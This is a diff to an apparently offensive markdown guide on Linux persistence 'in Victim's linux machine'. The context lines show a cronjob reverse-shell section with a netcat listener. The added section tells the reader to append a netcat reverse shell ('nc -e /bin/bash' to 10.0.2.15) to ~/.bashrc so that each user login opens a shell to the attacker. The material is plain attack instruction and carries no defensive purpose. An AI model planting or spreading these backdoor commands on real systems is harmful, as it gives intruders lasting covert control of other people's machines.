@@ -1,7 +1,7 @@
-# Linux_Persistence_Techniques
+#  Linux_Persistence_Techniques
 Methods to be persistent in Victim's linux machine or sever.
 
-#   Persistence via CRONJOB 
+# #  Persistence via CRONJOB 
 
 
 
@@ -37,6 +37,29 @@ nc -nvlp 1919
 ALRIGHT !!!!
 
 NOW WE GOT REVERSE SHELL EVERYSINGLE MINUTE..
+
+# # Unix Shell Configuration
+
+
+
+## Edit bashrc File
+
+
+```bash
+  nano ~/.bashrc
+```
+
+Add netcat reverse shell in this file.
+
+```bash
+ nc -e /bin/bash 10.0.2.15 1910 2>/dev/null 
+ ```
+
+ Save this file.
+
+Now ,Whenever a user logs in to the user account, the command in the .bashrc file will be executed and will consequently provide you with a reverse shell on the netcat listener.
+
+
 
 
 
